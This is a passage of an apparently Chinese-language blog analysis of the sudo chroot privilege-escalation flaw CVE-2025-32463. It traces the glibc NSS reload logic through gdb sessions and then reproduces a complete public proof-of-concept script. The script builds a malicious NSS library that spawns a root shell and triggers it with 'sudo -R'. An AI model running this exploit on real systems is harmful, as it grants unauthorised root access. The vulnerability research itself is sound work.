<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">nss_database_check_reload_and_get (struct nss_database_state *local,</span><br><span class="line">                                   nss_action_list *result,</span><br><span class="line">                                   <span class="keyword">enum</span> nss_database database_index)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">stat64_t64</span> <span class="title">str</span>;</span></span><br><span class="line">  <span class="comment">/* Acquire MO is needed because the thread that sets reload_disabled</span></span><br><span class="line"><span class="comment">     may have loaded the configuration first, so synchronize with the</span></span><br><span class="line"><span class="comment">     Release MO store there.  */</span></span><br><span class="line">  <span class="keyword">if</span> (atomic_load_acquire (&amp;local-&gt;data.reload_disabled))</span><br><span class="line">    &#123;</span><br><span class="line">      *result = local-&gt;data.services[database_index];</span><br><span class="line">      <span class="comment">/* No reload, so there is no error.  */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file_change_detection</span> <span class="title">initial</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (!__file_change_detection_for_path (&amp;initial, _PATH_NSSWITCH_CONF))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  __libc_lock_lock (local-&gt;lock);</span><br><span class="line">  <span class="keyword">if</span> (__file_is_unchanged (&amp;initial, &amp;local-&gt;data.nsswitch_conf))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Configuration is up-to-date.  Read it and return it to the</span></span><br><span class="line"><span class="comment">         caller.  */</span></span><br><span class="line">      *result = local-&gt;data.services[database_index];</span><br><span class="line">      __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">int</span> stat_rv = __stat64_time64 (<span class="string">&quot;/&quot;</span>, &amp;str);</span><br><span class="line">  <span class="keyword">if</span> (local-&gt;data.services[database_index] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Before we reload, verify that &quot;/&quot; hasn&#x27;t changed.  We assume that</span></span><br><span class="line"><span class="comment">        errors here are very unlikely, but the chance that we&#x27;re entering</span></span><br><span class="line"><span class="comment">        a container is also very unlikely, so we err on the side of both</span></span><br><span class="line"><span class="comment">        very unlikely things not happening at the same time.  */</span></span><br><span class="line">      <span class="keyword">if</span> (stat_rv != <span class="number">0</span></span><br><span class="line">	  || (local-&gt;root_ino != <span class="number">0</span></span><br><span class="line">	      &amp;&amp; (str.st_ino != local-&gt;root_ino</span><br><span class="line">		  ||  str.st_dev != local-&gt;root_dev)))</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">/* Change detected; disable reloading and return current state.  */</span></span><br><span class="line">        atomic_store_release (&amp;local-&gt;data.reload_disabled, <span class="number">1</span>);</span><br><span class="line">        *result = local-&gt;data.services[database_index];</span><br><span class="line">        __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (stat_rv == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      local-&gt;root_ino = str.st_ino;</span><br><span class="line">      local-&gt;root_dev = str.st_dev;</span><br><span class="line">    &#125;</span><br><span class="line">  __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">  <span class="comment">/* Avoid overwriting the global configuration until we have loaded</span></span><br><span class="line"><span class="comment">     everything successfully.  Otherwise, if the file change</span></span><br><span class="line"><span class="comment">     information changes back to what is in the global configuration,</span></span><br><span class="line"><span class="comment">     the lookups would use the partially-written  configuration.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nss_database_data</span> <span class="title">staging</span> =</span> &#123; .initialized = <span class="literal">true</span>, &#125;;</span><br><span class="line">  <span class="keyword">bool</span> ok = nss_database_reload (&amp;staging, &amp;initial);</span><br><span class="line">  <span class="keyword">if</span> (ok)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_lock_lock (local-&gt;lock);</span><br><span class="line">      <span class="comment">/* See above for memory order.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!atomic_load_acquire (&amp;local-&gt;data.reload_disabled))</span><br><span class="line">        <span class="comment">/* This may go back in time if another thread beats this</span></span><br><span class="line"><span class="comment">           thread with the update, but in this case, a reload happens</span></span><br><span class="line"><span class="comment">           on the next NSS call.  */</span></span><br><span class="line">        local-&gt;data = staging;</span><br><span class="line">      *result = local-&gt;data.services[database_index];</span><br><span class="line">      __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在刚进 <code>nss_database_check_reload_and_get</code> 函数的时候， 先是判断 <code>local-&gt;data.reload_dsiable</code><br>是否为 True， 如果为True 则直接 return</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (atomic_load_acquire (&amp;local-&gt;data.reload_disabled))</span><br><span class="line">  &#123;</span><br><span class="line">    *result = local-&gt;data.services[database_index];</span><br><span class="line">    <span class="comment">/* No reload, so there is no error.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后是判断<code>/etc/nsswitch.conf</code>文件是否修改:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_change_detection</span> <span class="title">initial</span>;</span></span><br><span class="line"><span class="keyword">if</span> (!__file_change_detection_for_path (&amp;initial, _PATH_NSSWITCH_CONF))</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">__libc_lock_lock (local-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (__file_is_unchanged (&amp;initial, &amp;local-&gt;data.nsswitch_conf))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Configuration is up-to-date.  Read it and return it to the</span></span><br><span class="line"><span class="comment">       caller.  */</span></span><br><span class="line">    *result = local-&gt;data.services[database_index];</span><br><span class="line">    __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>


<p>因为此时是刚 <code>chroot</code> 进来， 所以此时的 <code>/etc/nsswitch.conf</code>是一个修改的状态，所以代码会继续往下走。然后是一个重点逻辑, 如果代码判断成功，则设置 <code>local-&gt;data.reload_disabled</code> 的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (local-&gt;data.services[database_index] != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Before we reload, verify that &quot;/&quot; hasn&#x27;t changed.  We assume that</span></span><br><span class="line"><span class="comment">       errors here are very unlikely, but the chance that we&#x27;re entering</span></span><br><span class="line"><span class="comment">       a container is also very unlikely, so we err on the side of both</span></span><br><span class="line"><span class="comment">       very unlikely things not happening at the same time.  */</span></span><br><span class="line">     <span class="keyword">if</span> (stat_rv != <span class="number">0</span></span><br><span class="line">  || (local-&gt;root_ino != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (str.st_ino != local-&gt;root_ino</span><br><span class="line">	  ||  str.st_dev != local-&gt;root_dev)))</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">/* Change detected; disable reloading and return current state.  */</span></span><br><span class="line">       atomic_store_release (&amp;local-&gt;data.reload_disabled, <span class="number">1</span>);</span><br><span class="line">       *result = local-&gt;data.services[database_index];</span><br><span class="line">       __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>因为当前 <code>local-&gt;data.services[database_index]</code> 为 NULL （此时<code>((struct nss_database_state *)local)-&gt;data.services[nss_database_initgroups]</code>为空）</p>
<p>因此不会去设置 <code>local-&gt;data.reload_disabled</code> ， 此时 <code>local-&gt;data.reload_disabled</code> 仍然为 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p ((struct nss_database_state *)local)-&gt;data.reload_disabled</span><br><span class="line">$8 &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>然后保存当前的 root inode 和 root dev</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stat_rv == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    local-&gt;root_ino = str.st_ino;</span><br><span class="line">    local-&gt;root_dev = str.st_dev;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>最后就走到 <code>  bool ok = nss_database_reload (&amp;staging, &amp;initial);</code> 进行 database 的reload。</p>
<blockquote>
<p>[!小结]</p>
<p> 这里就解答了第一个问题， 由于 <code>getgrouplist</code> 的调用因此调用了<code>nss_database_check_reload_and_get</code> 函数。</p>
<p> 在<code>nss_database_check_reload_and_get</code>函数里，由于此时 <code>reload_disabled</code> 没有设置且<code>services[nss_database_initgroups]</code> 是空，所以走到了 <code>nss_database_reload</code> 。</p>
</blockquote>
<h3 id="reload-disabled"><a href="#reload-disabled" class="headerlink" title="reload_disabled"></a>reload_disabled</h3><p>对 <code>nss_database_check_reload_and_get</code> 断点 ， 并在 <code>pivot_root</code> 和<code>unpivot_root</code> 下断点。然后打印出在  <code>nss_database_check_reload_and_get</code> 的第三个参数<code>database_index</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;end</span><br><span class="line">(gdb) i b</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">3       breakpoint     keep y   &lt;MULTIPLE&gt;</span><br><span class="line">3.1                         y   0x00007ffff7d2b050 in pivot_root at ..&#x2F;sysdeps&#x2F;unix&#x2F;syscall-template.S:120</span><br><span class="line">3.2                         y   0x00007ffff7eb59b0 in pivot_root at .&#x2F;pivot.c:39</span><br><span class="line">4       breakpoint     keep y   0x00007ffff7eb5b00 in unpivot_root at .&#x2F;pivot.c:64</span><br><span class="line">5       breakpoint     keep y   0x00007ffff7d52300 in nss_database_check_reload_and_get at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">        i r rdx</span><br><span class="line">        c</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>我们可以清楚的看到在 <code>pivot_root</code> 和 <code>unpivot_root</code> 前后 <code>nss_database_check_reload_and_get</code> 的参数不同：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 3.2, pivot_root (new_root&#x3D;0x5555555a701c &quot;woot&quot;, state&#x3D;0x7fffffffcc38) at .&#x2F;pivot.c:39</span><br><span class="line">39	&#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Download failed: Invalid argument.  Continuing without source file .&#x2F;nss&#x2F;.&#x2F;nss&#x2F;nss_database.c.</span><br><span class="line"></span><br><span class="line">Breakpoint 5, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7fffffffc510, database_index&#x3D;nss_database_initgroups)</span><br><span class="line">    at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">warning: 396	.&#x2F;nss&#x2F;nss_database.c: No such file or directory</span><br><span class="line">rdx            0x6                 6</span><br><span class="line"></span><br><span class="line">Breakpoint 5, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7fffffffc510, database_index&#x3D;nss_database_group) at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">396	in .&#x2F;nss&#x2F;nss_database.c</span><br><span class="line">rdx            0x2                 2</span><br><span class="line"></span><br><span class="line">Breakpoint 4, unpivot_root (state&#x3D;state@entry&#x3D;0x7fffffffcc38) at .&#x2F;pivot.c:64</span><br><span class="line">64	&#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Download failed: Invalid argument.  Continuing without source file .&#x2F;nss&#x2F;.&#x2F;nss&#x2F;nss_database.c.</span><br><span class="line"></span><br><span class="line">Breakpoint 5, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7ffff7e10b68 &lt;__nss_group_database&gt;, database_index&#x3D;nss_database_group)</span><br><span class="line">    at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">warning: 396	.&#x2F;nss&#x2F;nss_database.c: No such file or directory</span><br><span class="line">rdx            0x2                 2</span><br><span class="line"></span><br><span class="line">Breakpoint 5, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7ffff7e10b68 &lt;__nss_group_database&gt;, database_index&#x3D;nss_database_group)</span><br><span class="line">    at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">396	in .&#x2F;nss&#x2F;nss_database.c</span><br><span class="line">rdx            0x2                 2</span><br><span class="line"></span><br><span class="line">Breakpoint 5, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7ffff7e10b00 &lt;__nss_shadow_database&gt;, database_index&#x3D;nss_database_shadow)</span><br><span class="line">    at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">396	in .&#x2F;nss&#x2F;nss_database.c</span><br><span class="line">rdx            0xf                 15</span><br><span class="line">Downloading separate debug info for libnss_&#x2F;woot1337.so.2</span><br><span class="line">Download failed: Invalid argument.  Continuing without source file .&#x2F;nss&#x2F;.&#x2F;nss&#x2F;nss_database.c.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整理出来就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nss_database_passwd 9</span><br><span class="line">nss_database_passwd 9</span><br><span class="line">nss_database_passwd 9</span><br><span class="line"># pivot_root</span><br><span class="line">nss_database_initgroups 6</span><br><span class="line">nss_database_group 2</span><br><span class="line"># unpivot_root</span><br><span class="line">nss_database_group 2</span><br><span class="line">nss_database_group 2</span><br><span class="line">nss_database_shadow 15 # load lib</span><br></pre></td></tr></table></figure>

<p>在章节 ”nss_database_check_reload_and_get 分析“的时候我们知道 <code>nss_database_initgroups</code>的时候 <code>reload_disabled</code> 不会设置。 </p>
<p>当到第一个  <code>nss_database_group</code> 的时候， 由于文件没有修改， 所以会直接 return。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) n</span><br><span class="line"><span class="number">418</span>	      *result = local-&gt;data.services[database_index];</span><br><span class="line">(gdb) l</span><br><span class="line"><span class="number">413</span>	  __libc_lock_lock (local-&gt;lock);</span><br><span class="line"><span class="number">414</span>	  <span class="keyword">if</span> (__file_is_unchanged (&amp;initial, &amp;local-&gt;data.nsswitch_conf))</span><br><span class="line"><span class="number">415</span>	    &#123;</span><br><span class="line"><span class="number">416</span>	      <span class="comment">/* Configuration is up-to-date.  Read it and return it to the</span></span><br><span class="line"><span class="comment">417	         caller.  */</span></span><br><span class="line"><span class="number">418</span>	      *result = local-&gt;data.services[database_index];</span><br><span class="line"><span class="number">419</span>	      __libc_lock_unlock (local-&gt;lock);</span><br><span class="line"><span class="number">420</span>	      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">421</span>	    &#125;</span><br><span class="line"><span class="number">422</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>不会走后续的逻辑。 </p>
<p>当走完 <code>unpivot_root</code>  来到第二个<code>nss_database_group</code>,   <code>reload_disabled</code> 没有设置， 走到文件修改比较。 因为此时已经 <code>unpivot_root</code>, 因此文件是有变化的， 程序会继续执行。</p>
<p>当走到 <code>if (local-&gt;data.services[database_index] != NULL)</code> 判断的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (local-&gt;data.services[database_index] != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Before we reload, verify that &quot;/&quot; hasn&#x27;t changed.  We assume that</span></span><br><span class="line"><span class="comment">       errors here are very unlikely, but the chance that we&#x27;re entering</span></span><br><span class="line"><span class="comment">       a container is also very unlikely, so we err on the side of both</span></span><br><span class="line"><span class="comment">       very unlikely things not happening at the same time.  */</span></span><br><span class="line">     <span class="keyword">if</span> (stat_rv != <span class="number">0</span></span><br><span class="line">  || (local-&gt;root_ino != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (str.st_ino != local-&gt;root_ino</span><br><span class="line">	  ||  str.st_dev != local-&gt;root_dev)))</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">/* Change detected; disable reloading and return current state.  */</span></span><br><span class="line">       atomic_store_release (&amp;local-&gt;data.reload_disabled, <span class="number">1</span>);</span><br><span class="line">       *result = local-&gt;data.services[database_index];</span><br><span class="line">       __libc_lock_unlock (local-&gt;lock);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>由于 <code>local-&gt;data.services[database_index]</code> 不为空， 因此会进入 if 的逻辑。 且此时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stat_rv &#x3D; 0</span><br><span class="line">((struct nss_database_state *)local)-&gt;root_ino &#x3D; 0x560d0</span><br><span class="line">((struct nss_database_state *)0x5555555a1ad0)-&gt;root_dev &#x3D; 0xfd01</span><br><span class="line">str.st_ino !&#x3D; local-&gt;root_ino</span><br><span class="line">str.st_dev !&#x3D; local-&gt;root_dev</span><br></pre></td></tr></table></figure>

<p>符合这个 if 的判断， 会进到 <code>atomic_store_release (&amp;local-&gt;data.reload_disabled, 1);</code> , 走完这句代码后 <code>local-&gt;data.reload_disabled</code> 就会被设置为 1， 然后直接返回。</p>
<p>那么之后剩下的 <code>nss_database_check_reload_and_get</code> 函数调用都会在开头就会返回，不会进到 <code>nss_database_reload</code> 逻辑里</p>
<blockquote>
<p>[!小结]<br> 这里就解决了第二个疑问， 为什么后续 <code>nss_database_check_reload_and_get</code> 函数调用不会进到 <code>nss_database_reload</code>。 因为代码逻辑当 chroot 回到原来的目录的时候，调用第一个 <code>nss_database_check_reload_and_get</code> 会将 <code>reload_disabled</code> 设置成 1 且返回， 后续的调用就不会再进 <code>nss_database_reload</code></p>
</blockquote>
<h3 id="load-evil-library"><a href="#load-evil-library" class="headerlink" title="load evil library"></a>load evil library</h3><p>利用直接参考贴原作者的就行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># sudo-chwoot.sh</span></span><br><span class="line"><span class="comment"># CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span></span><br><span class="line"><span class="comment">#                  @ Stratascale Cyber Research Unit (CRU)</span></span><br><span class="line">STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$&#123;STAGE?&#125;</span> || <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line">cat &gt; woot1337.c&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__attribute__((constructor)) void woot(void) &#123;</span></span><br><span class="line"><span class="string">  setreuid(0,0);</span></span><br><span class="line"><span class="string">  setregid(0,0);</span></span><br><span class="line"><span class="string">  chdir(&quot;/&quot;);</span></span><br><span class="line"><span class="string">  execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;passwd: /woot1337&quot;</span> &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;woot!&quot;</span></span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf <span class="variable">$&#123;STAGE?&#125;</span></span><br></pre></td></tr></table></figure>

<p>在不可信任的路径里配置一个 <code>etc/nsswitch.conf</code>, 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2$ cat woot&#x2F;etc&#x2F;nsswitch.conf</span><br><span class="line">passwd: &#x2F;woot1337</span><br></pre></td></tr></table></figure>

<p>一个有趣的说明，<code>nsswitch.conf</code>中的源的名称也被用作共享对象（库）的路径的一部分。例如，上述LDAP源转化为 <code>libnss_/woot1337.so.2.so</code>。 </p>
<p>那么在哪里加载恶意 so 的呢？ 我们对 dlopen 下一个断点， 然后查看一下他的 backtrace。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#0  0x00007ffff7e86191 in woot () from libnss_&#x2F;woot1337.so.2</span><br><span class="line">#1  0x00007ffff7fca6d5 in call_init (l&#x3D;0x5555555b5cb0, argc&#x3D;argc@entry&#x3D;4, argv&#x3D;argv@entry&#x3D;0x7fffffffe2b8, env&#x3D;env@entry&#x3D;0x7fffffffe2e0)</span><br><span class="line">    at .&#x2F;elf&#x2F;dl-init.c:60</span><br><span class="line">#2  0x00007ffff7fca824 in call_init (env&#x3D;&lt;optimized out&gt;, argv&#x3D;&lt;optimized out&gt;, argc&#x3D;&lt;optimized out&gt;, l&#x3D;&lt;optimized out&gt;) at .&#x2F;elf&#x2F;dl-init.c:120</span><br><span class="line">#3  _dl_init (main_map&#x3D;0x5555555b5cb0, argc&#x3D;4, argv&#x3D;0x7fffffffe2b8, env&#x3D;0x7fffffffe2e0) at .&#x2F;elf&#x2F;dl-init.c:121</span><br><span class="line">#4  0x00007ffff7fc65b2 in __GI__dl_catch_exception (exception&#x3D;exception@entry&#x3D;0x0, operate&#x3D;operate@entry&#x3D;0x7ffff7fd1cc0 &lt;call_dl_init&gt;,</span><br><span class="line">    args&#x3D;args@entry&#x3D;0x7fffffffc340) at .&#x2F;elf&#x2F;dl-catch.c:211</span><br><span class="line">#5  0x00007ffff7fd1d7c in dl_open_worker (a&#x3D;0x7fffffffc4f0) at .&#x2F;elf&#x2F;dl-open.c:829</span><br><span class="line">#6  dl_open_worker (a&#x3D;a@entry&#x3D;0x7fffffffc4f0) at .&#x2F;elf&#x2F;dl-open.c:792</span><br><span class="line">#7  0x00007ffff7fc651c in __GI__dl_catch_exception (exception&#x3D;exception@entry&#x3D;0x7fffffffc4d0, operate&#x3D;operate@entry&#x3D;0x7ffff7fd1ce0 &lt;dl_open_worker&gt;,</span><br><span class="line">   